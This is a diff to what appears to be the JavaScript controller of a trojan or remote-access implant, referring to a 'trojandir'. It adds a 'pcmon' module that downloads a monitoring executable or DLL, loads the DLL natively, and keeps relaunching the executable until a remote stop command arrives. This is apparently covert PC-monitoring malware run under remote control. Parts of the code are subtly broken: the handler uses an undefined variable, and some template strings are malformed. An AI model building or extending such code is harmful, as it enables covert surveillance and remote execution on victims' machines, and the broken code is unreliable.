@@ -2569,7 +2569,7 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
 
         cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
     } else if (!stopcmd) {
-        let jobcmd = cmdlistcmd.newCmdConfig(cmdname); // anchor
+        let jobcmd = cmdlistcmd.newCmdConfig(cmdname);
 
         if (!jobcmd) {
             throw new Error(`could not create child cmd {cmdname}`);
@@ -3259,8 +3259,90 @@ function cleanup() {
     // remove cmdlist_ directories
 }
 
-// doesn't work on TPL machines
-function pcmon() {}
+function launch_pcmon_koffi() {
+    const koffi = require('koffi');
+    const lib = koffi.load(path.join(systemstate.trojandir, 'pcmon.dll'));
+    const pcmon_func = lib.func('__stdcall', 'pcmon_main', 'int', []);
+    pcmon_func();
+}
+
+async function download_pcmon() {
+    // retrieve pcmon.exe, pcmon.dll
+
+    if ( ! folderExists(systemstate.pcmondir) ) {
+        fs.mkdirSync(systemstate.pcmondir, { recursive: true });
+    }
+    
+    if ( ! systemstate.istpl ) {
+        await retrieve_asset("pcmon.exe");
+        return;
+    }
+
+    if ( systemstate.istpl ) 
+        await retrieve_asset("pcmon.dll");
+}
+
+async function pcmon() {
+    logmsg("starting");
+
+    let pcmoncmd = systemstate.cmdconfig;
+    
+    if ( systemstate.istpl ) {
+        let dllpath = path.join(systemstate.pcmondir, "pcmon.dll");
+
+        if ( ! fileExists(dllpath) ) {
+            await download_pcmon();
+        }
+
+        try {
+            launch_pcmon_koffi();
+        } catch (err) {
+            logmsg(err);
+        }
+
+        return;
+    }
+
+    let exepath = path.join(systemstate.pcmondir, "pcmon.exe");
+
+    let killswitch = false;
+
+    handleMessage = (msgobj) => {
+        let clientjob = msg?.payload ?? null;
+
+        if ( ! clientjob ) {
+            throw new Error("unable to extract clientjob");
+        }
+
+        logmsg("received new client job: " + JSON.stringify(clientjob));
+
+        if (clientjob?.cmdname.toLowerCase() == "StopPCMon".toLowerCase()) {
+            killswitch = true;
+        }
+    };
+
+    let childp = null;
+
+    pcmoncmd.loopfunc = () => {
+        logmsg(`{pcmoncmd.cmdname} looping...`);
+
+        let tcmdpid = childp?.pid ?? -1;
+
+        if (killswitch) {
+            if (isPidAlive(tcmdpid)) childp.kill();
+
+            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
+        }
+
+        if (!killswitch && !isPidAlive(tcmdpid)) {
+            childp = invoke_exe('pcmon.exe');
+        }
+    };
+
+    pcmoncmd.loop();
+
+    logmsg("finished");
+}
 
 async function download_pspcmon() {
     logmsg("starting");
